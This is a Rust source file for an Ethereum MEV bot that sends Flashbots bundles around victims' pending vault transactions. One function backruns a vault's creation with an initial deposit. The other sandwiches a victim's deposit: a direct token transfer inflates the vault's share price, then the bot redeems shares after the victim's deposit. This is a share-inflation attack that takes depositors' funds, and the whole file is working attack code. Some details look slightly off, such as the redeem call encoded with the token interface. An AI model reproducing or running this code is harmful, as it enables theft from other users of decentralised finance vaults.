use ethers::core::types::{H256,Bytes as EthBytes};
use eyre::Result;
use alloy::{
    dyn_abi::DynSolValue, json_abi::JsonAbi, network::{EthereumWallet, TransactionBuilder}, primitives::{Address, Bytes, U256}, rpc::types::TransactionRequest, signers::local::PrivateKeySigner
};
use alloy_contract::Interface;
use alloy_eips::eip2718::Encodable2718;

use ethers_signers::LocalWallet;


use jsonrpsee_http_client::{transport, HttpClientBuilder};
use mev_share_rpc_api::{BundleItem, FlashbotsSignerLayer, MevApiClient, SendBundleRequest};
use std::{fs, sync::Arc};


use super::helpers::NewPendingTx;
use crate::utils::constants::{Env, TARGET_TOKEN};

pub struct Client {
    inner: Arc<dyn MevApiClient + Sync + Send>,
}

pub struct Executor {
    pub vault_interface: Interface,
    pub token_interface: Interface,
    pub token_address: Address,
    pub signer: EthereumWallet,
    pub client: Client,
}

impl Executor {
    pub fn new() -> Self {
        let env = Env::new();

        let token_address = TARGET_TOKEN.parse::<Address>().unwrap();

        let private_signer = env.private_key.parse::<PrivateKeySigner>().unwrap();
        let signer = EthereumWallet::from(private_signer);

        let identity = env.identity_key.parse::<LocalWallet>().unwrap();

        let http = HttpClientBuilder::default()
            .set_middleware(
                tower::ServiceBuilder::new()
                    .map_err(transport::Error::Http)
                    .layer(FlashbotsSignerLayer::new(identity)),
            )
            .build("https://relay.flashbots.net:443")
            .unwrap();
        let client = Client { inner: Arc::new(http) };

        let vault_interface = {
            let path = "src/data/contract_abis/MaliciousVault.json";
            let json = fs::read_to_string(path).unwrap();
            let abi: JsonAbi = serde_json::from_str(&json).unwrap();
            Interface::new(abi)
        };

        let token_interface = {
            let path = "src/data/contract_abis/ERC20.json";
            let json = fs::read_to_string(path).unwrap();
            let abi: JsonAbi = serde_json::from_str(&json).unwrap();
            Interface::new(abi)
        };

        Self {
            vault_interface,
            token_interface,
            token_address,
            signer,
            client,
        }
    }   

    pub async fn backrun_creation(
        &self,
        pending_tx: &mut NewPendingTx,
        vault_address: Address,
    ) -> Result<()> {
        let victim_tx_hash = H256::from_slice(pending_tx.tx.hash.as_slice());

        // Approve token Tx
        let call_data_1 = Bytes::copy_from_slice(
            self.token_interface.encode_input(
                "approve",
                &[
                        DynSolValue::Address(vault_address),
                        DynSolValue::Uint(U256::from(1_000000000000000000_u128), 256)
                    ]
                )?
            .as_slice());
    
        let backrun_tx_1 = TransactionRequest::default()
            .with_to(self.token_address)
            .with_input(call_data_1);

        let backrun_1_signed = backrun_tx_1.build(&self.signer).await?;

        // Deposit to vault Tx
        let call_data_2 = Bytes::copy_from_slice(
            self.vault_interface.encode_input(
                "deposit",
                &[
                        DynSolValue::Uint(U256::from(1_000000000000000000_u128), 256),
                        DynSolValue::Address(self.signer.default_signer().address())
                    ]
                )?
            .as_slice());
    
        let backrun_tx_2 = TransactionRequest::default()
            .with_to(vault_address)
            .with_input(call_data_2);
    
        let backrun_2_signed = backrun_tx_2.build(&self.signer).await?;
    
        // Encode transactions
        let mut encoded = vec![];
        backrun_1_signed.encode_2718(&mut encoded);
        let converted_bytes_1: EthBytes = EthBytes::from(encoded);
        let mut encoded = vec![];
        backrun_2_signed.encode_2718(&mut encoded);
        let converted_bytes_2: EthBytes = EthBytes::from(encoded);
    
        // Build bundle
        let mut bundle_body = Vec::new();
        bundle_body.push(BundleItem::Hash { hash: victim_tx_hash });
        bundle_body.push(BundleItem::Tx { tx: converted_bytes_1, can_revert: false });
        bundle_body.push(BundleItem::Tx { tx: converted_bytes_2, can_revert: false });
    
        let bundle = SendBundleRequest { bundle_body, ..Default::default() };
    
        // Send bundle
        let resp = self.client.inner.send_bundle(bundle.clone()).await?;
        println!("Got a bundle response: {:?}", resp);

        Ok(())
    }

    pub async fn sandwich_deposit(
        &self,
        pending_tx: &mut NewPendingTx,
        deposit_amount: U256,
        vault_address: Address,
    ) -> Result<()> {
        let victim_tx_hash = H256::from_slice(pending_tx.tx.hash.as_slice());

        // Approve token Tx
        let call_data_1 = Bytes::copy_from_slice(
            self.token_interface.encode_input(
                "transfer",
                &[
                        DynSolValue::Address(vault_address),
                        DynSolValue::Uint(deposit_amount, 256)
                    ]
                )?
            .as_slice());
    
        let frontrun_tx = TransactionRequest::default()
            .with_to(self.token_address)
            .with_input(call_data_1);

        let frontrun_signed = frontrun_tx.build(&self.signer).await?;

        // Withdraw from vault Tx
        let call_data_2 = Bytes::copy_from_slice(
            self.token_interface.encode_input(
                "redeem",
                &[
                        DynSolValue::Uint(U256::from(1_000000000000000000_u128), 256),
                        DynSolValue::Address(self.signer.default_signer().address()),
                        DynSolValue::Address(self.signer.default_signer().address()),
                    ]
                )?
            .as_slice());

        let backrun_tx = TransactionRequest::default()
            .with_to(vault_address)
            .with_input(call_data_2);
    
        let backrun_signed = backrun_tx.build(&self.signer).await?;
    
        let mut encoded = vec![];
        frontrun_signed.encode_2718(&mut encoded);
        let converted_bytes_1: EthBytes = EthBytes::from(encoded);

        let mut encoded = vec![];
        backrun_signed.encode_2718(&mut encoded);
        let converted_bytes_2: EthBytes = EthBytes::from(encoded);
    
        // Build bundle
        let mut bundle_body = Vec::new();
        bundle_body.push(BundleItem::Tx { tx: converted_bytes_1, can_revert: false });
        bundle_body.push(BundleItem::Hash { hash: victim_tx_hash });
        bundle_body.push(BundleItem::Tx { tx: converted_bytes_2, can_revert: false });
    
        let bundle = SendBundleRequest { bundle_body, ..Default::default() };
    
        // Send bundle
        let resp = self.client.inner.send_bundle(bundle.clone()).await?;
        println!("Got a bundle response: {:?}", resp);
        Ok(())
    }

}